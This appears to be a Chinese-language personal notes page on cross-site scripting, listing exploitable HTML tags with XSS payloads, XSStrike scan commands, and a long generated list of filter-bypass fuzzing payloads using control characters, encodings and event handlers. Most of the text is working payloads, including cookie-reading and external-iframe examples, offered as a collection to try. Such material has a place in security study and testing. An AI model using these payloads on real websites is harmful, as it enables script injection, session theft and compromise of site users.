TIME&#xFF08;&#x5B9A;&#x65F6;&#x4EA4;&#x4E92;&#x5F0F;&#x591A;&#x5A92;&#x4F53;&#x6269;&#x5C55;&#xFF09;&#x5A92;&#x4F53;&#x6807;&#x8BB0;&#x64AD;&#x653E;&#x7684;&#x9AD8;&#x7EA7;&#x6D41;&#x683C;&#x5F0F;&#xFF08;ASF&#xFF09;&#x6587;&#x4EF6;&#x5904;&#x7406;&#x5D4C;&#x5165;&#x5728;ASF&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x811A;&#x672C;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x6B64;&#x4E8B;&#x4EF6;&#x5C06;&#x89E6;&#x53D1;&#xFF09; seekSegmentTime() &#xFF08;&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x5728;&#x5143;&#x7D20;&#x7684;&#x6BB5;&#x65F6;&#x95F4;&#x7EBF;&#x4E0A;&#x5B9A;&#x4F4D;&#x6307;&#x5B9A;&#x70B9;&#x5E76;&#x4ECE;&#x8BE5;&#x70B9;&#x5F00;&#x59CB;&#x64AD;&#x653E;&#x7684;&#x65B9;&#x6CD5;&#x3002;&#x8BE5;&#x6BB5;&#x5305;&#x542B;&#x4E00;&#x6B21;&#x91CD;&#x590D;&#x7684;&#x65F6;&#x95F4;&#x7EBF;&#xFF0C;&#x5305;&#x62EC;&#x4F7F;&#x7528;AUTOREVERSE&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x53CD;&#x5411;&#x64AD;&#x653E;&#x3002;&#xFF09; HTML&#x53EF;&#x5229;&#x7528;&#x6807;&#x7B7E;&#x5408;&#x96C6;&#xFF1A;IMG123456&#x57FA;&#x7840;&#x5F62;&#x5F0F;&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;&lt;IMG &#x9664;&#x4E86;&#x4F7F;&#x7528;&#x4F2A;&#x534F;&#x8BAE;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;svg&#x683C;&#x5F0F;&#x7684;&#x56FE;&#x7247;&#x6765;&#x6267;&#x884C;Javascript&#x811A;&#x672C;&#xFF1A; 1&lt;img src=&quot;test.svg&quot; &gt; 1234&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/head&gt;&lt;/html&gt; &#x53EA;&#x4F7F;&#x7528;src&#x5E76;&#x4E0D;&#x662F;&#x5F88;&#x597D;&#xFF0C;&#x5E94;&#x8BE5;&#x5C1D;&#x8BD5;&#xFF1A;&lt;img src=a onerror=alert(&apos;XSS&apos;)&gt;&#x6765;&#x8FDB;&#x884C;&#x66F4;&#x591A;&#x7684;&#x64CD;&#x4F5C;&#x3002; &#x66F4;&#x591A;&#x64CD;&#x4F5C;&#xFF1A; &#x4F7F;&#x7528;src&#x8FDB;&#x884C;CSRF&#x7B49;&#x5176;&#x4ED6;&#x64CD;&#x4F5C;&#xFF1A;&lt;img src=&quot;CSRF_URL&quot;&gt; a123456javascript&#x4F2A;&#x534F;&#x8BAE;&#xFF1A;&lt;a href=javascript:alert(2)&gt;data&#x534F;&#x8BAE;&#x6267;&#x884C;javascript&#xFF1A;&lt;a href=data:text/html;base64,amF2YXNjcmlwdCUzQWFsZXJ0JTI4MiUyOQ==&gt;(&#x5C1D;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x5F39;&#x4E0D;&#x4E86;) input1234567&lt;input type=&quot;text&quot; id=&quot;search-text&quot; name=&quot;query&quot; value=&quot;?&quot; /&gt;&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;&#x4F7F;&#x7528;onfocus&#x4E8B;&#x4EF6;&#xFF1A;&lt;input type=&quot;text&quot; id=&quot;search-text&quot; name=&quot;query&quot; value=&quot;&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;&quot; /&gt; body1234&#x4F7F;&#x7528;background&#xFF0C;onload&lt;BODY BACKGROUND=&quot;javascript:alert(2)&quot;&gt;&lt;BODY ONLOAD=alert(2)&gt; iframe12345&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x7F51;&#x9875;&lt;iframe src=http://xss.rocks/scriptlet.html&gt;&lt;/iframe&gt;&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt; svg1&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(document.domain)&quot;/&gt; &#x6709;&#x8DA3;&#x7684;&#x6587;&#x7AE0; &#x8DE8;&#x7AD9;&#x7684;&#x827A;&#x672F;&#xFF1A;XSS Fuzzing &#x7684;&#x6280;&#x5DE7;&#x91CC;&#x9762;&#x5E76;&#x6CA1;&#x6709;&#x8BB2;&#x5F88;&#x591A;&#x7684;Fuzz&#x6280;&#x5DE7;&#xFF0C;&#x4F46;&#x662F;&#x8BB2;&#x4E86;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x4E94;&#x4E2A;&#x6848;&#x4F8B;&#x3002;(&#x6635;&#x79F0;XSS&#xFF0C;URL&#x8DF3;&#x8F6C;XSS&#xFF0C;#&#x53F7;&#x5229;&#x7528;&#x7B49;) 21 things you can do with XSS &#x7ED9;&#x5F00;&#x53D1;&#x8005;&#x7684;&#x7EC8;&#x6781;XSS&#x9632;&#x62A4;&#x5907;&#x5FD8;&#x5F55; The 12 Exploits of XSS-mas&#x540E;&#x9762;&#x7684;&#x51E0;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x73B0;&#x5728;&#x6765;&#x770B;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x96BE;&#x7406;&#x89E3;&#x7684;&#x3002; XssPayloads - twitter AwesomeXSS &#x6162;&#x6162;&#x6536;&#x96C6;&#x66F4;&#x65B0;&#x2026; &#x5F85;&#x603B;&#x7ED3;&#xFF1A; &#x6D45;&#x6790;&#x56FE;&#x7247;XSS&#x4E2D;&#x7684;&#x54EA;&#x4E9B;&#x6280;&#x672F;&#x95EE;&#x9898; &#x5DE5;&#x5177; XSS Fuzzer &#x7528;&#x4E8E;&#x751F;&#x6210;XSS&#x7684;payload &#x4E0B;&#x65B9;&#x6709;&#x5DF2;&#x7ECF;&#x751F;&#x6210;&#x597D;&#x7684;&#xFF0C;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x8FC7;&#xFF0C;&#x5148;&#x5199;&#x4E0A;&#x3002; XSStrike &#x57FA;&#x672C;&#x7528;&#x6CD5;&#xFF1A; 12345678910Scan a single URL:python xsstrike.py -u &quot;http://example.com/search.php?q=query&quot;Supplying POST data:python xsstrike.py -u &quot;http://example.com/search.php&quot; --data &quot;q=query&quot;Crawl a website:python xsstrike.py -u &quot;http://example.com/page.php&quot; --crawlMore use: https://github.com/s0md3v/XSStrike/wiki/Usage#scan-a-single-url &#x4E00;&#x4E2A;&#x5DF2;&#x7ECF;&#x751F;&#x6210;&#x597D;&#x7684;payload&#xFF0C;&#x6211;&#x8FD8;&#x6CA1;&#x7528;&#x8FC7;&#xFF0C;&#x5148;&#x5199;&#x4E0A;&#x6765;&#x3002; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666&lt;script\\x20type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x3Etype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x0Dtype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x09type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x0Ctype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x2Ftype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x0Atype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&apos;`&quot;&gt;&lt;\\x3Cscript&gt;javascript:alert(1)&lt;/script&gt; &apos;`&quot;&gt;&lt;\\x00script&gt;javascript:alert(1)&lt;/script&gt;&lt;img src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/img&gt;&lt;audio src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/audio&gt;&lt;video src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/video&gt;&lt;body src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/body&gt;&lt;image src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/image&gt;&lt;object src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/object&gt;&lt;script src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/script&gt;&lt;svg onResize svg onResize=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onResize&gt;&lt;title onPropertyChange title onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/title onPropertyChange&gt;&lt;iframe onLoad iframe onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onLoad&gt;&lt;body onMouseEnter body onMouseEnter=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onMouseEnter&gt;&lt;body onFocus body onFocus=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onFocus&gt;&lt;frameset onScroll frameset onScroll=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/frameset onScroll&gt;&lt;script onReadyStateChange script onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/script onReadyStateChange&gt;&lt;html onMouseUp html onMouseUp=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseUp&gt;&lt;body onPropertyChange body onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPropertyChange&gt;&lt;svg onLoad svg onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onLoad&gt;&lt;body onPageHide body onPageHide=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPageHide&gt;&lt;body onMouseOver body onMouseOver=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onMouseOver&gt;&lt;body onUnload body onUnload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onUnload&gt;&lt;body onLoad body onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onLoad&gt;&lt;bgsound onPropertyChange bgsound onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/bgsound onPropertyChange&gt;&lt;html onMouseLeave html onMouseLeave=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseLeave&gt;&lt;html onMouseWheel html onMouseWheel=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseWheel&gt;&lt;style onLoad style onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/style onLoad&gt;&lt;iframe onReadyStateChange iframe onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onReadyStateChange&gt;&lt;body onPageShow body onPageShow=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPageShow&gt;&lt;style onReadyStateChange style onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/style onReadyStateChange&gt;&lt;frameset onFocus frameset onFocus=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/frameset onFocus&gt;&lt;applet onError applet onError=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onError&gt;&lt;marquee onStart marquee onStart=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/marquee onStart&gt;&lt;script onLoad script onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/script onLoad&gt;&lt;html onMouseOver html onMouseOver=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseOver&gt;&lt;html onMouseEnter html onMouseEnter=&quot;javascript:parent.javascript:alert(1)&quot;&gt;&lt;/html onMouseEnter&gt;&lt;body onBeforeUnload body onBeforeUnload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onBeforeUnload&gt;&lt;html onMouseDown html onMouseDown=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseDown&gt;&lt;marquee onScroll marquee onScroll=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/marquee onScroll&gt;&lt;xml onPropertyChange xml onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/xml onPropertyChange&gt;&lt;frameset onBlur frameset onBlur=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/frameset onBlur&gt;&lt;applet onReadyStateChange applet onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onReadyStateChange&gt;&lt;svg onUnload svg onUnload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onUnload&gt;&lt;html onMouseOut html onMouseOut=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseOut&gt;&lt;body onMouseMove body onMouseMove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onMouseMove&gt;&lt;body onResize body onResize=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onResize&gt;&lt;object onError object onError=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/object onError&gt;&lt;body onPopState body onPopState=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPopState&gt;&lt;html onMouseMove html onMouseMove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseMove&gt;&lt;applet onreadystatechange applet onreadystatechange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onreadystatechange&gt;&lt;body onpagehide body onpagehide=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onpagehide&gt;&lt;svg onunload svg onunload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onunload&gt;&lt;applet onerror applet onerror=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onerror&gt;&lt;body onkeyup body onkeyup=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onkeyup&gt;&lt;body onunload body onunload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onunload&gt;&lt;iframe onload iframe onload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onload&gt;&lt;body onload body onload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onload&gt;&lt;html onmouseover html onmouseover=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onmouseover&gt;&lt;object onbeforeload object onbeforeload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/object onbeforeload&gt;&lt;body onbeforeunload body onbeforeunload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onbeforeunload&gt;&lt;body onfocus body onfocus=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onfocus&gt;&lt;body onkeydown body onkeydown=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onkeydown&gt;&lt;iframe onbeforeload iframe onbeforeload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onbeforeload&gt;&lt;iframe src iframe src=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe src&gt;&lt;svg onload svg onload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onload&gt;&lt;html onmousemove html onmousemove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onmousemove&gt;&lt;body onblur body onblur=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onblur&gt;\\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;&apos;&quot;`&gt;&lt;script&gt;/* *\\x2Fjavascript:alert(1)// */&lt;/script&gt;&lt;script&gt;javascript:alert(1)&lt;/script\\x0D&lt;script&gt;javascript:alert(1)&lt;/script\\x0A&lt;script&gt;javascript:alert(1)&lt;/script\\x0B&lt;script charset=&quot;\\x22&gt;javascript:alert(1)&lt;/script&gt;&lt;!--\\x3E&lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;--&gt;&lt;!-- ---&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;--&gt;&lt;!-- --\\x00&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;--&gt;&lt;!-- --\\x21&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;--&gt;&lt;!-- --\\x3E&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;`&quot;&apos;&gt;&lt;img src=&apos;#\\x27 onerror=javascript:alert(1)&gt;&lt;a href=&quot;javascript\\x3Ajavascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&quot;&apos;`&gt;&lt;p&gt;&lt;svg&gt;&lt;script&gt;a=&apos;hello\\x27;javascript:alert(1)//&apos;;&lt;/script&gt;&lt;/p&gt;&lt;a href=&quot;javas\\x00cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x07cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x0Dcript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x0Acript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x08cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x02cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x03cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x04cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x01cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x05cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x0Bcript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x09cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x06cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\\x0Ccript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;script&gt;/* *\\x2A/javascript:alert(1)// */&lt;/script&gt;&lt;script&gt;/* *\\x00/javascript:alert(1)// */&lt;/script&gt;&lt;style&gt;&lt;/style\\x3E&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;&lt;style&gt;&lt;/style\\x0D&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;&lt;style&gt;&lt;/style\\x09&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;&lt;style&gt;&lt;/style\\x20&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;&lt;style&gt;&lt;/style\\x0A&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;&quot;&apos;`&gt;ABC&lt;div style=&quot;font-family:&apos;foo&apos;\\x7Dx:expression(javascript:alert(1);/*&apos;;&quot;&gt;DEF&quot;&apos;`&gt;ABC&lt;div style=&quot;font-family:&apos;foo&apos;\\x3Bx:expression(javascript:alert(1);/*&apos;;&quot;&gt;DEF&lt;script&gt;if(&quot;x\\\\xE1\\x96\\x89&quot;.length==2) { javascript:alert(1);}&lt;/script&gt;&lt;script&gt;if(&quot;x\\\\xE0\\xB9\\x92&quot;.length==2) { javascript:alert(1);}&lt;/script&gt;&lt;script&gt;if(&quot;x\\\\xEE\\xA9\\x93&quot;.length==2) { javascript:alert(1);}&lt;/script&gt;&apos;`&quot;&gt;&lt;\\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;&apos;`&quot;&gt;&lt;\\x00script&gt;javascript:alert(1)&lt;/script&gt;&quot;&apos;`&gt;&lt;\\x3Cimg src=xxx:x onerror=javascript:alert(1)&gt;&quot;&apos;`&gt;&lt;\\x00img src=xxx:x onerror=javascript:alert(1)&gt;&lt;script src=&quot;data:text/plain\\x2Cjavascript:alert(1)&quot;&gt;&lt;/script&gt;&lt;script src=&quot;data:\\xD4\\x8F,javascript:alert(1)&quot;&gt;&lt;/script&gt;&lt;script src=&quot;data:\\xE0\\xA4\\x98,javascript:alert(1)&quot;&gt;&lt;/script&gt;&lt;script src=&quot;data:\\xCB\\x8F,javascript:alert(1)&quot;&gt;&lt;/script&gt;&lt;script\\x20type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x3Etype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x0Dtype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x09type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x0Ctype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x2Ftype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\\x0Atype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;ABC&lt;div style=&quot;x\\x3Aexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:expression\\x5C(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:expression\\x00(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:exp\\x00ression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:exp\\x5Cression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\x0Aexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\x09expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE3\\x80\\x80expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x84expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xC2\\xA0expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x80expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\x0Dexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\x0Cexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x87expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\x20expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x88expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\x00expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x86expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x85expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x82expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\x0Bexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x81expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x83expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\\xE2\\x80\\x89expression(javascript:alert(1)&quot;&gt;DEF&lt;a href=&quot;\\x0Bjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x0Fjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xC2\\xA0javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x05javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x18javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x11javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x88javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x89javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x80javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x17javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x03javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x0Ejavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x1Ajavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x00javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x10javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x82javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x20javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x13javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x09javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x8Ajavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x14javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x19javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\xAFjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x1Fjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x81javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x1Djavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x87javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x07javascript:javascript:alert(1)&quot; 